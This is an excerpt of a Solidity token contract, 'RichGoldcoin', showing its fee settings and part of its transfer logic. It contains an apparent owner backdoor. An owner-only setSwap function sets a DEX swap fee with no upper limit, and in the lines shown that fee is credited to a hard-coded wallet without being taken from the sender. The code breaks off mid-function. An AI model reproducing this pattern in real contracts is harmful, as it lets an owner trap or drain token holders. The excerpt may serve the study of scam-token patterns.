...
contract RichGoldcoin is Context, IERC20, Ownable {
    ...
    address public _developmentWalletAddress = 0xc3AfE53aEB03F86989C0A480c7e6CF744da54c72;
    address public swapAddress = 0xc3AfE53aEB03F86989C0A480c7e6CF744da54c72;
    uint256 private constant MAX = ~uint256(0);
    uint256 private _tTotal = 10000 * 10**18;
    uint256 private _rTotal = (MAX - (MAX % _tTotal));
    uint256 private _tFeeTotal;
    string private _name = "RichGoldcoin";
    string private _symbol = "RGC";
    uint8 private _decimals = 18;
    uint256 public _taxFee = 11111;
    uint256 private _previousTaxFee = _taxFee;
    uint256 public _developmentFee = 30000;
    uint256 private _previousDevelopmentFee = _developmentFee;
    uint256 public _liquidityFee = 25555;
    uint256 private _previousLiquidityFee = _liquidityFee;
    uint256 public dexSwapFee = 12; //take fee while sell token to dex
    ...
    function setSwap(uint256 _swapFee) public onlyOwner{
        dexSwapFee = _swapFee;
    }
    ...
    function _transfer(
        ...
        if(to==uniswapV2Pair&&takeswapFee){
            uint256 swapFee = amount.mul(dexSwapFee).div(100);
            _rOwned[swapAddress] = _rOwned[swapAddress].add(swapFee);
        if(_isExcluded[swapAddress])
            _tOwned[swapAddress] = _tOwned[swapAddress].add(swapFee);
        }
        if(from==uniswapV2Pair&&takeswapFee){
            uint256 swapFee = amount.mul(dexSwapFee).div(100);
            _rOwned[swapAddress] = _rOwned[swapAddress].add(swapFee);
        if(_isExcluded[swapAddress])
            _tOwned[swapAddress] = _tOwned[swapAddress].add(swapFee);
